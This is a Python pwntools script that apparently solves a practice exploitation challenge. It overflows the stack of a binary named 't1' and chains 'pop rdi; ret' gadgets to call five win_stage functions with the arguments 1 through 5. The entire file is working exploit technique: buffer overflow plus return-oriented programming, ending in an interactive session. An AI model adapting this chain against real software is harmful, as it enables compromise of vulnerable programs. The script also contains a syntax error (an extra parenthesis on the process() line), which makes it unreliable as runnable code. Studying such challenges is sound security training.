#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux') # set arch
binary_name = 't1'
p = process('./' + binary_name))

#gdb.attach(p, '''
#b *main
#b *main+445
#b *win_stage_1
#''')

#pattern = cyclic(200, n=8) #n = 8 for x64
overflow_until_ret = b'A' * cyclic_find('paaaaaaa', n=8)

# getting address of functions by symbols
binary = ELF(binary_name)
win_stage1 = p64(binary.symbols['win_stage_1'])
win_stage2 = p64(binary.symbols['win_stage_2'])
win_stage3 = p64(binary.symbols['win_stage_3'])
win_stage4 = p64(binary.symbols['win_stage_4'])
win_stage5 = p64(binary.symbols['win_stage_5'])

# ropping with the power of pwntools
binary_rop = ROP(binary_name)
# search and get address of 'pop rdi, ret'
pop_rdi_ret_address = p64(binary_rop.rdi.address)
# search and get address of 'ret'
ret_address = p64(binary_rop.ret.address)

# population RDI with the value for the JNE in the win's functions
exploit = b''
exploit += overflow_until_ret
# stage 1
exploit += pop_rdi_ret_address
exploit += p64(0x1)
exploit += win_stage1
# stage 2
exploit += pop_rdi_ret_address
exploit += p64(0x2)
exploit += win_stage2
# stage 3
exploit += pop_rdi_ret_address
exploit += p64(0x3)
exploit += win_stage3
# stage 4
exploit += pop_rdi_ret_address
exploit += p64(0x4)
exploit += win_stage4
# stage 5
exploit += pop_rdi_ret_address
exploit += p64(0x5)
exploit += win_stage5

#p.sendline(pattern)
p.sendline(exploit)
p.interactive()
